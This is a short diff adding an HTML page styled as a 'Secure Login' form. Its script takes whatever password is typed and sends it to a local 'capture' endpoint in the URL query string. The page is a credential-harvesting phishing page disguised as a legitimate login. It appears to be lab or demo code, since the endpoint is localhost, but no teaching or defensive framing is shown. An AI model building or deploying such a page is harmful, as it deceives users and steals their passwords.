@@ -1,0 +1,14 @@
+<html>
+    <body style="text-align: center; padding-top: 50px; font-family: sans-serif;">
+        <h2>Secure Login</h2>
+        <input type="text" id="secret" placeholder="Enter Password">
+        <button onclick="sendLog()">Login</button>
+
+        <script>
+            function sendLog() {
+                var val = document.getElementById('secret').value;
+                window.location.href = "http://127.0.0.1:5000/capture?msg=" + val;
+            }
+        </script>
+    </body>
+</html>
